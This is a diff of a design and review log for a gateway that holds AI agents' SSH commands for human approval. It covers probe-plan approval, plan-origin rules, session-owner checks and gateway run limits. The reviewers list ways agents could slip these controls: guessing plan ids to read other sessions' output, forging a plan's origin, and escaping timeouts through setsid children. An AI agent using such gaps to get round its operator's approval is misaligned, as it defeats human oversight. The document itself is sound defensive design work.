+read-lane deviation is accepted, with a smaller scope than the notes say
+(see "On the deviation" below). The blocker is that the grouped approval does
+not cover the commands for an agent on the default SSH mode.
+
+* **AG1 (must, blocker): under the default `ssh_mode` (`approval`), the
+  probe's plan never covers its commands.** `ssh_exec` sets `force_jit` when
+  the agent's mode is `approval` (`core/ssh_exec.py`, `force_jit =
+  policy['ssh_mode'] == DEFAULT_SSH_MODE`). `receive_request` then skips the
+  F3 plan check (`main.py`, `if sid and not frozen and not force_jit …`).
+  So for every agent left at the default:
+  * the operator approves the probe's plan;
+  * each command then files its own JIT request;
+  * `probe_result` (`wait=False`) gets `pending` for all of them and returns
+    `refused`.
+
+  The operator is asked 1 + N times, and nothing runs. The test passes only
+  because it replaces `ssh_exec` with a fake. **Fix:** the operator approved
+  these exact bytes once, so the second prompt adds nothing. But letting a
+  plan cover commands in `approval` mode changes what that mode means, so
+  this needs the security reviewer.
+  * **Proposed:** under `approval`, a plan item is claimable only when its
+    plan was created by probe code. That means a server-side `origin='probe'`
+    column, never the free-text `note`; the same rule as F16's V5 for recipe
+    items. `normal` mode keeps today's behaviour.
+  * **Test:** drive the real `receive_request` with an `approval`-mode
+    agent:
+    * one approval, then each command runs once;
+    * an ordinary agent-proposed plan still does not cover it in `approval`
+      mode;
+    * a second `probe_result` runs nothing.
+* **AG2 (must): `probe_result` returns a stored digest before it checks the
+  session** (`probes.py` 402–405 come before the session check at 407). Any
+  agent that guesses a plan id reads another session's digest: journal lines,
+  ports, container lists. **Fix:** move the stored-result read after the
+  session check (and bind it to the agent, as F12 does for tickets). **Test:**
+  a second session gets `probe_not_found` for a finished plan.
+* **AG3 (must): `dns_check` builds its own tool instead of using the
+  registered one.**
+  * It calls `execute_integration_call` with a hand-made tool:
+    * the Pi-hole v5 path `admin/api.php?customdns`;
+    * an integration loaded with `include_secret=False`.
+  * Against a real v6 Pi-hole it cannot authenticate, and the path does not
+    exist.
+  * It also skips the tool's enabled flag and `read_policy`.
+  * **Fix:** call F14's `core.inventory._call_tool(integration,
+    'local_dns_records', {})`. That function is gated by
+    `is_read_integration_call` and uses the v6 handler. Then parse its shape.
+  * **Test:** with the tool disabled, the result says so; the record is
+    found through the real handler with a stubbed upstream.
+* **AG4 (must): `docker inspect` prints JSON, but `_kv` looks for
+  `key=value`.** So `running` and `status` are always empty. The full
+  inspect also carries `Config.Env`, often database passwords that
+  `scrub_string` does not know, and F12 stores the output (`_store_result`).
+  **Fix:**
+  * `docker inspect --format '{{.State.Status}} {{.State.Running}} {{.RestartCount}} {{.State.StartedAt}}' NAME`;
+  * `docker ps -a --filter name=^NAME$ --format '{{.Names}}\t{{.Status}}'`
+    instead of every container's full command line;
+  * the same narrowing for `pct`: `pct status VMID` and `pct config VMID`
+    only.
+
+  **Test:** a stubbed inspect line parses into `status`/`running`/`restarts`,
+  and no `Env` text reaches the digest or the stored output.
+* **AG5 (must): `recent_changes` is almost always empty.**
+  * It keeps rows whose `reason` starts with `jit`, but `reason` is the
+    agent's free text.
+  * It reads `get_all_requests()`: the newest 200 rows from every host.
+  * It does not look at writes at all.
+
+  **Fix:** a SQL query by `target_ip` over the last 24 h, keeping rows that
+  ran (`approved`/`consumed`) and that F1 labels as having a write step. The
+  `command` is shown through `scrub_string`. **Test:** a write on the host
+  appears; a read, another host's write, and a 25-hour-old write do not.
+* **AG6 (should): the journal digest.**
+  * `errors` counts all 200 lines, not errors: add `-p warning`.
+  * `last` is the probe time for every row: use the line's own timestamp.
+  * `_COUNTY` turns hex-looking words (`add`, `bad`, `be`, `cafe`) into
+    `<n>`, so unrelated messages merge. Require at least one digit, or a
+    `0x` prefix.
+* **AG7 (should): `disk_pressure` and `diagnose_service` keep the first
+  `df`/`ss` rows when the cap bites.** Sort `filesystems` by `use_pct`
+  descending and `log_dirs` by size before capping, so the cut drops the
+  least useful rows.
+
+**On the deviation.** The notes say the probes cannot use the read lane
+because P2 needs `systemctl show`. The code uses `systemctl is-active`, which
+already passes `is_read_ssh`. Checked on this branch:
+* **pass:** `systemctl is-active`, `ss -tlnp`, `pct list`, `docker ps -a`,
+  `df -h`, `df -i` and `du -x -d 1 /var/log`;
+* **refused:**
+  * `journalctl … -o short-iso` (`option:-o`);
+  * `pct config` (`subcommand`);
+  * `docker inspect` (`sensitive-path`, which is right, since it dumps the
+    env).
+
+The lane is shadow-only and `on` is locked, so this changes nothing today.
+Keep the grouped approval as the path. Add a test that records which probe
+commands are lane-eligible, so a later change to either side shows up in a
+diff. Dropping `-o short-iso` (and parsing the default format) would bring
+the journal step into the lane; worth doing if AG6 touches that line anyway.
+`active_since`/`NRestarts` are not needed for this round.
+
+**After the fixes:** AG2–AG7 come back to the feature reviewer. AG1 is
+decided by the security reviewer first: DeepSeek should implement the
+proposed rule behind a test, and both reviewers read it.
+
+**Security reviewer — AG1 decision (2026-11-10): the proposed rule is
+accepted, with six conditions.**
+
+Why it's acceptable:
+* `approval` means "a human approves the exact bytes before they run".
+* A plan built by server code from a probe definition (written by the
+  operator), and approved on one card that lists every command, meets that.
+  Asking a second time adds nothing.
+* An agent-proposed plan does not meet it. Its items, hosts and `max_uses`
+  are the agent's choice, and in `approval` mode the operator chose to see
+  each command. So the rule turns on who **wrote** the plan, not on who
+  approved it.
+
+Conditions:
+1. **Origin is written only by server code.**
+   * `session_plans.origin`, `NOT NULL DEFAULT 'agent'`; every existing row
+     is `agent`.
+   * `create_plan()` takes `origin` as a keyword. The MCP `plan_propose`
+     path and every HTTP route hard-code `agent`. No request field, note or
+     item field can set or change it.
+   * Allowed values are a fixed set: `agent`, `probe`, and later `recipe`
+     and `check`.
+   * Test: a proposal that sends `origin: 'probe'` in any field is stored as
+     `agent`.
+2. **A server plan is closed.**
+   * No agent-facing path may add, edit or re-enable an item of a plan whose
+     origin isn't `agent`. The operator may still remove items.
+   * The card shows the origin (for example "probe: disk_usage") and lists
+     every item.
+   * Items name a specific host, never `*`.
+3. **The claim checks the session's owner.**
+   * In `approval` mode a covered claim also requires the session's owner to
+     be the verified agent on the request. This is F10's M2 rule; the SSH
+     `claim_plan_item` does not have it today.
+   * The agent identity is the one the signed prefix carries, which the
+     agent MAC already covers.
+   * Test: agent B, in `approval` mode, sending A's session id with a
+     matching command does not claim A's probe item.
+4. **Nothing else moves.**
+   * Freeze and zero-trust still skip plan coverage.
+   * The encoded-payload block and the blocklists still come first.
+   * The session override and the read lane stay off under `force_jit`.
+   * The change is one branch in `receive_request`: `force_jit` permits a
+     plan claim only when the claimed item's plan origin is in
+     `SERVER_PLAN_ORIGINS`. `normal` mode is unchanged.
+   * The approved request records `session-plan:<plan>:<item>` and the
+     origin in its reason, so the audit shows why no card appeared.
+5. **It is tested with the real `receive_request`.** The cases are the ones
+   AG1 lists, plus conditions 1 and 3.
+6. **`check` (F22) is not decided here.** This rule covers a plan item that
+   the agent's own call claims while the operator's approval is fresh. An
+   item that runs later with no agent call and no human present (F22's
+   check) is an *unattended* run. It goes through F19's
+   `approve_unattended()`, with the limit and the capability, and F22's
+   design review decides whether it may use this origin at all. `recipe`
+   (F16 V5) also still claims by request id, as agreed for F16.
+
+DeepSeek implements this. Both reviewers read the diff.
+
+### Code round 2 — AG1 (own commit) and AG2–AG7
+
+**AG1 — `1bf7233`, on its own, because security decides it.** The security
+reviewer's six conditions are in:
+* `session_plans.origin` is `NOT NULL DEFAULT 'agent'` and only
+  `create_plan(origin=...)` writes it, from `agent|probe|recipe`. The MCP and
+  HTTP proposal paths pass no origin, so a field named `origin` in an item or a
+  request is stored as `agent` (test).
+* A server plan must name a specific host — an item with `*` or `''` is
+  refused as `invalid_host` (condition 2).
+* `receive_request` permits a claim under `force_jit` only for `origin='probe'`
+  plans; an agent plan still never covers a command in `approval` mode, and
+  `normal` mode is unchanged. The claim also requires the session's owner to be
+  the verified agent (F10's M2 rule), and the approved row's reason is
+  `session-plan:<plan>:<item>:probe`, so the audit shows why no card appeared.
+* The plan card shows a small `probe` origin badge (`_plan_payload` carries
+  `origin`).
+* Tests drive the **real** `receive_request`: a probe plan covers each command
+  once (and only once), an agent plan does not, another agent cannot spend the
+  item, no request field can set the origin, and an any-host server plan is
+  refused.
+
+**AG2–AG7 — `bd71c1f`.**
+* **AG2:** `probe_result` checks the plan's session **and its owner** before
+  returning a stored digest; another session gets `probe_not_found`.
+* **AG3:** `dns_check` calls F14's `_call_tool` (exists, enabled, read policy,
+  v6 handler); a missing tool is reported in the digest as an error.
+* **AG4:** `docker inspect --format '{{.State.Status}} {{.State.Running}}
+  {{.RestartCount}} {{.State.StartedAt}}'`, `docker ps -a --filter name=^NAME$`
+  and `pct status`/`pct config` — no `Config.Env`, no every-container listing.
+* **AG5:** `recent_changes` is a SQL query by host over 24 h, keeping rows F1
+  says have a write step, scrubbed.
+* **AG6:** `journalctl … -p warning`, `last` from the line's timestamp, and a
+  hex-looking word only normalises with `0x` or a digit.
+* **AG7:** filesystems sort by use %, log dirs by size, ports by port before
+  the cap drops anything.
+
+`bash scripts/verify.sh`: `2698 passed, 22 skipped, 7 warnings in 537.81s (0:08:57)`.
+
+**Code round 2 (feature reviewer, 2026-11-11, at `153cf74`): approved; merging.**
+
+AG1 meets the security reviewer's six conditions (`eca8982`):
+* the origin is set by server code only, and an `agent` default is what a
+  forged value becomes;
+* a server plan names one specific host;
+* the claim narrows to `origin='probe'` under `force_jit` and checks the
+  session's owner;
+* the reason and the audit row carry the origin;
+* the card shows a badge;
+* the tests drive the real `receive_request`.
+
+AG2–AG7 are in:
+* the stored digest is behind the session and owner check;
+* `dns_check` goes through `_call_tool`;
+* the `inspect` is formatted, with no `Config.Env`;
+* `recent_changes` is a SQL query using F1 writes;
+* the journal uses `-p warning` and the line's own timestamp;
+* the cap sorts first.
+
+* **AI1 (should, next F15 touch): the `docker ps` format is unquoted.**
+  `--format {{.Names}}\t{{.Status}}` reaches the shell bare, so `\t`
+  becomes `t` (`webtUp 3 hours`). Quote it as the `inspect` format is
+  quoted, and test the exact command string.
+
+**AI1 — `fix/f15-docker-format`, 2026-11-11. Fixed, with the mechanism
+recorded exactly.** The `ps` template is now single-quoted like the
+`inspect` one, and the tab is written as an escape the *shell* must not
+touch: `--format '{{.Names}}\t{{.Status}}'` (in the Python source
+`"\t"`, so the command text holds a backslash and a `t`).
+
+What the old string did, checked rather than guessed: in the Python source
+`'…\t…'` is a **tab**, so the unquoted template was a word separator, not
+a backslash escape. The command split into
+`['docker', 'ps', '-a', '--filter', 'name=^db$', '--format', '{{.Names}}', '{{.Status}}']` —
+docker got `--format {{.Names}}` and `{{.Status}}` as a stray argument. The
+reviewer's `webtUp 3 hours` is the same bug seen from the other side; the
+fix is the same either way.
+
+Tests: `test_the_two_docker_commands_are_exactly_these_strings` pins both
+commands byte for byte (and checks `shlex.split` gives docker one
+`--format` argument); `test_the_ps_format_reaches_a_shell_unchanged` runs
+the real command through `/bin/sh` with a stub `docker` that reports the
+argument it received, so a shell change that splits or unescapes it fails
+the test. 58 tests in the F15 file.
+
+`bash scripts/verify.sh`: `2767 passed, 22 skipped, 8 warnings in 573.07s (0:09:33)`.
 
 ---
 
@@ -6831,7 +10120,36 @@ _(implementer)_
 
 ### Reviewer notes
 
-_(reviewer)_
+**Pre-implementation notes (2026-11-09).** Close these points in the
+implementation; each needs a test. F17 starts after F15. F16's recipe tools
+are optional, so the preset must work without them.
+
+* **A1 (must): define "read-only `ssh_exec`".** The command is accepted only
+  if F4's `eligible()` would pass it, and anything else is **refused**
+  (`read_only_agent`), not queued for approval. A small model should not be
+  able to flood the operator with write requests. Enforce it on the server
+  from the agent's policy (`ssh_mode: 'read-only'`), never from the tool
+  description.
+* **A2 (must): preset tools that exist.** Build the allowlist by filtering the
+  preset list against the tool registry. `recipe_*` and the probes may not be
+  there yet. Store the preset version on the agent row, so a later preset
+  change never silently widens an existing agent.
+* **A3 (must): `escalate` is agent text.** Cap the summary (2 KiB), rate-limit
+  it (per agent, a few per hour), and render it escaped in the notification
+  and the UI, with no links made clickable. "Always allowed" should mean
+  "not gated", not "not limited".
+* **A4 (must): who may read an escalation.** `get_escalation` is limited to
+  the operator and the agents the **operator** names in settings (for
+  example `escalation_readers: ["hermes"]`), never a list the escalating
+  agent supplies. Test that another agent gets `not_found`, not
+  `forbidden`.
+* **A5 (should): compact descriptions keep the safety words.** Every
+  allowlisted tool has a compact variant of at most 160 characters. A test
+  checks that a tool whose full description says "needs approval" or
+  "read-only" still says so in the compact one.
+* **A6 (should): the eval script never touches a real dashboard.** It refuses
+  a non-loopback base URL and creates its own temp DB, with synthetic hosts
+  only (`192.0.2.0/24`, `*.example.test`).
 
 ---
 
@@ -6873,11 +10191,1999 @@ is sent only for unattended rows; old gateway versions are refused for `on`.
 
 ### Implementer notes
 
-_(design note goes here first)_
+**Status: design note only — no code on this branch.** F19 is design first
+and needs the security reviewer's sign-off before any code. It is also one of
+the preconditions for unlocking F4's `on` mode, so it is the next gateway
+change after F12.
+
+#### 1. What is bounded, and what is not
+
+A **run limit** exists only for a row the dashboard approved **without a
+human**: today that is the read lane (`reason = read-lane`), later F15 probes
+and read-only F16 recipes. The row's `reason` is the switch, and it is set by
+the dashboard, never by the gateway.
+
+* A human-approved run (JIT, plan, session override, host override, window,
+  allowlist) keeps today's behaviour: no timeout, no cap. A human saw the
+  command and can watch it. Changing that would be a different feature with
+  its own review.
+* A run limit is **advisory on the dashboard and authoritative on the
+  gateway**: the gateway refuses a limit it cannot parse, ignores one it did
+  not get, and never runs unbounded when it was told to bound.
+* A limit hit is a *completed* run, not a refusal: `status: ran`,
+  `exit_code: 124` for time (or the command's own code for a byte cut), and
+  a marker line. The ticket is burned either way; a bounded run cannot be
+  retried by replaying the ticket.
+
+#### 2. Where the limit travels
+
+The limit is a JSON field next to the payload, **not** part of the ticket
+line. The ticket line is `v2|ts|agent|session|cmd` and is consumed by
+gateways that may predate F19; adding a field there would either break them
+or need a `v3` tag for no benefit. Three responses carry it, all on the
+dashboard side:
+
+* `POST /api/request` → `{"status":"ok","request_id":…,"run_limit":{…}}`
+  when the row it just created is unattended. This is the path the read lane
+  uses (the gateway gets `approved` immediately and runs without polling).
+* `GET /api/request_status/{id}` → `run_limit` while `status` is `approved`,
+  so the polling path and a late claim both see it.
+* `GET /api/ticket/{id}` → the same field beside `ticket`, for a gateway that
+  claims the ticket in one call.
+
+A locked-box ticket claimed from the poller has no limit beside it, by
+construction: those rows were approved by a human (or by a plan), and §1 says
+they keep today's behaviour.
+
+Shape and ranges (defaults 60 s / 1 MiB):
+
+```
+run_limit: {"seconds": 60, "bytes": 1048576}
+seconds  5..300       bytes  65536..8388608
+```
+
+The values live in a `meta` key (`run_limit`) so the operator can set them
+without a deploy, and a settings endpoint (`GET`/`PUT /api/settings/run-limit`,
+session auth) validates the range. A missing key means the defaults; a
+corrupt key also means the defaults (a broken setting must not remove the
+bound). The dashboard never sends a value outside the range; the gateway
+still checks.
+
+#### 3. The gateway: parse, wrap, cap
+
+The limit arrives as a JSON body the gateway already parses for
+`request_id`. Two variables hold it, and `RUN_LIMIT_*` empty means "no limit"
+(human-approved):
+
+```bash
+# F19: run limits for a row the dashboard approved with no human watching.
+# Empty means "no limit" (a human approved this). Anything unusable also
+# means no auto-run: never a partially applied bound.
+RUN_LIMIT_SECS=""
+RUN_LIMIT_BYTES=""
+
+parse_run_limit() {   # $1 = dashboard JSON body
+  local secs="" bytes=""
+  secs=$(printf '%s' "$1" | python3 -c '
+import json, sys
+d = (json.load(sys.stdin) or {}).get("run_limit") or {}
+sys.stdout.write("%d %d" % (int(d.get("seconds") or 0), int(d.get("bytes") or 0)))
+' 2>/dev/null || echo "0 0")
+  set -- $secs
+  case "${1:-}" in ''|*[!0-9]*) return 1 ;; esac
+  case "${2:-}" in ''|*[!0-9]*) return 1 ;; esac
+  if [ "$1" -lt 5 ] || [ "$1" -gt 300 ] || [ "$2" -lt 65536 ] || [ "$2" -gt 8388608 ]; then
+    return 1
+  fi
+  RUN_LIMIT_SECS="$1"
+  RUN_LIMIT_BYTES="$2"
+  return 0
+}
+```
+
+Called right after the `/api/request` response is parsed; a `run_limit` that
+is present but unusable **refuses the call** (`[LOCKED] Invalid run_limit …`)
+instead of running unbounded. A 200 response without the field leaves both
+variables empty (human-approved path).
+
+The run itself is wrapped inside `run_sanitized`, so every run path (read
+lane, window, lockbox, JIT) is bounded by the same code and a future path
+cannot forget it:
+
+```bash
+run_sanitized() {
+  local rc=0 ... time_limited="0" byte_limited="0"
+  local -a run_argv=("$@")
+  if [ -n "$RUN_LIMIT_SECS" ]; then
+    # -k (not --kill-after) is what both GNU and BusyBox timeout understand;
+    # the extra 5 s only decides how long a stuck process gets to die.
+    run_argv=(timeout -k 5 "$RUN_LIMIT_SECS" "${run_argv[@]}")
+    time_limited="1"
+  fi
+  ...
+  if [ -n "$RUN_LIMIT_BYTES" ]; then
+    # F19: cap the stream AFTER sanitize (secrets are still redacted) and
+    # BEFORE the FIFO, so F5 stores exactly the bytes the agent saw. The
+    # pipeline runs under `pipefail`, so read the command's own status from
+    # PIPESTATUS[0]; the byte cut is a separate flag, not a status.
+    { "${run_argv[@]}" 2>&1 | sanitize | head -c $((RUN_LIMIT_BYTES + 1)) \
+        | tee "$ESHU_OUT_FIFO"; } >/dev/null 2>&1
+    rc=${PIPESTATUS[0]}
+    LIMIT_HIT=""
+    if [ -s "$ESHU_OUT_CAP" ] && [ "$(stat -c '%s' "$ESHU_OUT_CAP")" -gt "$RUN_LIMIT_BYTES" ]; then
+      byte_limited="1"
+      LIMIT_HIT="bytes"
+      # Drop the probe byte so the cap is exact.
+      truncate -s "$RUN_LIMIT_BYTES" "$ESHU_OUT_CAP"
+    fi
+  else
+    ...today's branches, unchanged...
+  fi
+  if [ "$time_limited" = "1" ] && [ "$rc" -eq 124 ]; then
+    LIMIT_HIT="time"
+    say "   [ESHU limit: stopped after ${RUN_LIMIT_SECS} s]"
+  fi
+  if [ "$byte_limited" = "1" ]; then
+    say "   [ESHU limit: output cut at ${RUN_LIMIT_BYTES} bytes]"
+  fi
+  ...
+}
+```
+
+Details that matter, and why:
+
+* **`head -c $((bytes + 1))` and a probe byte.** With exactly `bytes`, a stream
+  that happens to end at the cap is indistinguishable from one that was cut.
+  One extra byte distinguishes them; it is dropped before anything is stored
+  or shown, so the cap the operator set is the cap that is kept.
+* **`truncate -s`** (coreutils) may be missing on a minimal host. The
+  fallback for that case is `head -c "$RUN_LIMIT_BYTES" "$ESHU_OUT_CAP" >
+  "$ESHU_OUT_CAP.trim" && mv -f …`; the design note records the fallback so
+  the implementer does not have to invent one. The marker and the F5 row are
+  identical either way.
+* **`pipefail` and `PIPESTATUS[0]`.** The existing code reads `$?` after a
+  `||`, which is the *pipeline's* status under `pipefail`; for a capped run
+  that would report `head`'s or `sed`'s SIGPIPE (141) as the command's exit
+  code. Reading `PIPESTATUS[0]` gives the command's real status, so
+  `[ESHU exit=N]` and the envelope's `exit_code` keep meaning "what the
+  command returned". The SIGPIPE the writer gets when `head` closes is
+  expected and is not reported.
+* **The F5 capture still works.** The FIFO reader is unchanged; it now
+  receives at most `bytes + 1` bytes, so `tail -c 16385` keeps the whole head.
+  `post_exec_result` stores that, and a byte cut marks the row
+  `truncated: true` as it does today. The new field is `limit: time|bytes`
+  (empty when no limit fired), which is a new additive column
+  (`request_results.limit TEXT DEFAULT ''`) and an optional body field on
+  `/api/exec-result`.
+* **`[ESHU exit=N]` in direct mode.** For a time limit N is `124` (GNU and
+  BusyBox timeout both use it), so an SSH agent sees
+  `[ESHU exit=124]` plus `[ESHU limit: stopped after 60 s]`. For a byte cut
+  the sentinel is unchanged (typically `[ESHU exit=0]`) and the marker is the
+  only sign, which is correct: the command was not stopped.
+* **MCP mode.** The markers go through `say`, so they land in the envelope's
+  `messages`; the exit code is the envelope's `exit_code`; a byte cut sets
+  `truncated: true` exactly as a 64 KiB tail would. Nothing new is needed in
+  the envelope format.
+* **The timeout only bounds the run, not the whole call.** `timeout` kills
+  the direct child (`bash -c`), and `-k 5` forces it 5 s later if it ignores
+  SIGTERM. A command that backgrounds a child can still outlive it; that is
+  the same statement F12 §4 makes about killing the local `ssh`, and the
+  reason the dashboard's `timeout` and this limit are separate bounds.
+
+#### 4. Old gateways and old dashboards
+
+* **Old gateway, new dashboard.** The gateway ignores `run_limit` entirely,
+  so nothing is bounded there. The dashboard therefore refuses to *auto-run*
+  an unattended row on a gateway that has not reported the capability
+  `run_limits: "v1"` (a new `gateways` column, sent by the installer in its
+  existing `/api/register`, exactly like F12's
+  `ssh_agent_format`/`ssh_ticket_format`). Instead of approving, the row is
+  created `pending` with `reason = "read-lane-no-limits"` and an audit event
+  `read_lane_no_limits`; the human sees it in the queue with that reason.
+  With F4's `on` hard-locked, this is the second gate that must be green
+  before `on` is unlocked at all.
+* **New gateway, old dashboard.** No `run_limit` in the response → no limit →
+  today's behaviour. The capability is reported but unused.
+* **The capability is reported, not inferred from the version string.**
+  Version strings lie after a dev update and a rollback; a reported
+  capability is what the installer that wrote the script knows. It is stored
+  on the gateway row and shown in the gateway card.
+* **Rollout order.** F19 ships with every gateway on `off` (no lane), the
+  capability starts empty, and the dashboard refuses `on` until every gateway
+  the operator wants in the lane reports `v1`. That is the F4 § 8 gate, and
+  it keeps "old gateway" a state that cannot auto-run.
+
+#### 5. What is deliberately out of scope
+
+* No per-command limits, no priorities, no queue: one fleet-wide pair of
+  numbers, overridable only by the operator's settings.
+* No output limit for a human-approved run: the human can interrupt it, and
+  F5's 16 KiB tail already bounds what is *stored*.
+* No `nice`/`cpulimit`/cgroup: a wall-clock bound and a byte cap are what the
+  residual risk named; CPU accounting is a different feature.
+* No change to the 90 s JIT wait, the 60 s `wait: true` poll or F12's
+  `timeout` — those bound the *conversation*, not the command.
+
+#### 6. Tests to add (final)
+
+Gateway sandbox (`tests/test_f19_limits.py`), with the existing harness:
+
+* a `sleep 10` command with `seconds: 5` is stopped, `exit_code` 124, the
+  marker in `messages` (MCP) and `[ESHU exit=124]` + marker (direct), and the
+  F5 row has `limit: time`;
+* a command printing 2 MiB with `bytes: 65536` keeps exactly 65536 bytes,
+  `truncated` is true, the marker says `output cut at 65536 bytes`, and the F5
+  row has `limit: bytes`;
+* a stream that ends exactly at the cap is **not** marked cut (the probe
+  byte);
+* a human-approved run (no `run_limit`) is unbounded: `sleep 6` finishes and
+  no marker appears;
+* `run_limit` present but out of range / non-numeric / negative → the call is
+  refused and nothing runs;
+* `run_limit` on a 200 response with `status: pending` is ignored (no run);
+* the F5 capture path is untouched for an unlimited run (regex-allowlist and
+  ticket paths).
+
+Dashboard (`tests/test_f19_limits.py`):
+
+* `run_limit` is added to `/api/request` only for `reason = read-lane`
+  (pending rows and human-approved rows get none);
+* `/api/request_status/{id}` and `/api/ticket/{id}` carry it for an
+  unattended approved row;
+* defaults are 60/1048576; a corrupt meta value falls back to the defaults;
+  the settings endpoint rejects 4 s, 301 s, 65535 bytes and 8 MiB + 1;
+* `receive_request` refuses to auto-approve a read-lane row on a gateway
+  without `run_limits: v1` (row pending, reason `read-lane-no-limits`, audit
+  row written);
+* with the capability present, the row is approved as today;
+* `/api/exec-result` stores `limit` and rejects an unknown value.
+
+`bash scripts/verify.sh`: `2331 passed, 7 warnings in 430.08s (0:07:10)` (docs-only; this branch is `feature-roadmap` + the note, so F12's new tests are not in it).
+
+### Round 2 — design after review round 1 (D1–D4, S1, L1–L8)
+
+This section is the design of record where it differs from §1–§6 above; the
+parts it does not repeat still stand. It folds the feature review (D1–D4, S1)
+and the security review (L1–L8) together, as the reviewers asked.
+
+#### 1. Scope: bounded by default (L1)
+
+The dashboard sends a `run_limit` for **every row it approves without a human
+approving that exact command** — not only `read-lane`. A new auto-approval
+path must go through one helper (`approve_unattended()` in `main.py`), which
+sets `requests.unattended = 1`; a test walks the auto-approval reasons and
+fails if an unattended row ends up without a limit.
+
+Named exemptions (unchanged behaviour, accepted risk): a JIT click, an F3 plan
+item, a session override and a host override. Each is a human decision about
+this run (or a run the operator deliberately allowed), and they may
+legitimately take a long time. The gateway-local paths (exact and regex
+allowlists, approved windows) never receive a limit and are unchanged.
+
+#### 2. Travel, stickiness and the capability (L2, L7)
+
+The field still travels in three responses, but two rules change:
+
+* **L7: the capability is per request, not only per gateway.** The gateway
+  sends `"run_limits":"v1"` in the `/api/request` body, and the dashboard
+  auto-approves an unattended row only when that request carries it. A
+  self-update or a rollback can change the script without re-registering, so
+  the stored `gateways.run_limits` column is for the card only — never the
+  decision.
+* **L2: once set, it stays.** `parse_run_limit` returns three results —
+  absent, valid, invalid — not 1/0. The first valid limit seen applies; a
+  later response that omits the field does not clear it; two different limits
+  combine with `min()` per field. The round-1 sketch split `"60 1048576"`
+  with `set -- $secs`, which never splits because the script sets `IFS` to
+  newline and tab; the triple is tab-separated and read with `read -r`.
+
+```bash
+RUN_LIMIT_SECS=""; RUN_LIMIT_BYTES=""; RUN_LIMIT_STATE="absent"   # absent|valid|invalid
+
+parse_run_limit() {   # $1 = JSON body. 0 = ok (absent or valid), 1 = invalid
+  local kind="" secs="" bytes="" triple
+  triple=$(printf '%s' "$1" | python3 -c '
+import json, sys
+doc = json.load(sys.stdin) or {}
+rl = doc.get("run_limit")
+if rl is None:
+    print("absent")
+elif not isinstance(rl, dict):
+    print("invalid")
+else:
+    s, b = rl.get("seconds"), rl.get("bytes")
+    if isinstance(s, bool) or isinstance(b, bool) or not isinstance(s, int) or not isinstance(b, int):
+        print("invalid")
+    else:
+        print("valid\t%d\t%d" % (s, b))
+' 2>/dev/null) || triple="invalid"
+  IFS=$'\t' read -r kind secs bytes <<< "$triple"
+  case "$kind" in
+    absent)
+      # L2: a later response without the field does not clear an earlier limit.
+      return 0 ;;
+    valid)
+      case "${secs}${bytes}" in ''|*[!0-9]*) RUN_LIMIT_STATE="invalid"; return 1 ;; esac
+      if [ "$secs" -lt 5 ] || [ "$secs" -gt 300 ] || \
+         [ "$bytes" -lt 65536 ] || [ "$bytes" -gt 8388608 ]; then
+        RUN_LIMIT_STATE="invalid"; return 1
+      fi
+      if [ "$RUN_LIMIT_STATE" = "valid" ]; then   # L2: the smaller one wins
+        [ "$secs" -lt "$RUN_LIMIT_SECS" ] && RUN_LIMIT_SECS="$secs"
+        [ "$bytes" -lt "$RUN_LIMIT_BYTES" ] && RUN_LIMIT_BYTES="$bytes"
+      else
+        RUN_LIMIT_SECS="$secs"; RUN_LIMIT_BYTES="$bytes"
+      fi
+      RUN_LIMIT_STATE="valid"; return 0 ;;
+    *) RUN_LIMIT_STATE="invalid"; return 1 ;;
+  esac
+}
+```
+
+A response with the field absent leaves the state as it was; a present but
+unusable value refuses the call (`[LOCKED] Invalid run_limit …`), because a
+half-applied bound is worse than no auto-run.
+
+#### 3. The gateway pipeline (D1, D2, D3, L4, L5, S1, L6)
+
+* **D1/L4: only MCP mode discards stdout.** The round-1 sketch sent the whole
+  group to `/dev/null`, so a direct-SSH agent would have seen nothing. The
+  redirect belongs on the `tee` of the MCP branch only.
+* **D3/L4: survive `set -e` and keep `PIPESTATUS`.** The pipeline runs with
+  errexit off, `_ps=("${PIPESTATUS[@]}")` is taken in the next statement, and
+  `rc=${_ps[0]}`. A `|| true` would clear `PIPESTATUS` and turn a 124 into 0.
+* **L5: cap the raw stream before `sanitize` too.** `sanitize` is `sed`, which
+  holds one line until it sees a newline; a newline-free pseudo-file would
+  grow its memory without limit. A `head -c $((bytes + 1))` sits before
+  `sanitize` as well as after it. **Decision on cut detection:** the marker
+  and `limit: bytes` are decided from the **visible** (post-`sanitize`)
+  stream, which is what the agent saw; the raw cap is a memory bound only and
+  is never written to disk unsanitized. Redaction can shorten a raw-cut
+  stream below the cap, in which case the agent did not see a cut and no
+  marker is shown — the bytes are still bounded, and this is recorded as an
+  accepted imprecision rather than writing secrets to a probe file.
+* **L6/S1: the time bound must cover the whole call.** GNU `timeout` (without
+  `--foreground`) signals the command's process group, so ordinary background
+  children die with it; only a child that calls `setsid` escapes. BusyBox
+  `timeout` signals only the direct child, so a grandchild holding the pipe
+  could hold the call — and its ticket — past the limit. **Decision:** GNU
+  `timeout` is part of the capability. The gateway reports
+  `run_limits: v1` only when `timeout --version` names GNU coreutils, and it
+  refuses a `run_limit` it receives without it (never a partial bound). The
+  BusyBox stub test asserts the refusal, not a best-effort run.
+* **D2 and the exit code.** A byte cut normally kills the writer with
+  SIGPIPE, so `_ps[0]` is `141`, not 0; report it. `limit: bytes` and the
+  marker say the output was cut, so the agent does not read 141 as the
+  command's own choice. `limit: time` is set only when `rc == 124` **and**
+  the elapsed time is at least the limit (a command may exit 124 by itself).
+  The `[ESHU exit=N]` sentinel and the envelope's `exit_code` keep the real
+  value.
+
+```bash
+cap_raw()     { if [ -n "$RUN_LIMIT_BYTES" ]; then head -c $((RUN_LIMIT_BYTES + 1)); else cat; fi; }
+cap_visible() { if [ -n "$RUN_LIMIT_BYTES" ]; then head -c $((RUN_LIMIT_BYTES + 1)); else cat; fi; }
+
+run_sanitized() {
+  local rc=0 ... run_argv=("$@")
+  if [ -n "$RUN_LIMIT_SECS" ]; then
+    # -k, not --kill-after: both timeouts understand it. GNU signals the group.
+    run_argv=(timeout -k 5 "$RUN_LIMIT_SECS" "${run_argv[@]}")
+  fi
+  set +e
+  if [ -n "$ESHU_OUT_FIFO" ] && [ -p "$ESHU_OUT_FIFO" ]; then
+    if [ "$ESHU_MCP" = "1" ]; then
+      "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+        | tee "$ESHU_OUT_FIFO" >/dev/null
+    else                                  # D1: the direct agent still sees it
+      "${run_argv[@]}" 2>&1 | cap_raw | sanitize | cap_visible \
+        | tee "$ESHU_OUT_FIFO"
+    fi
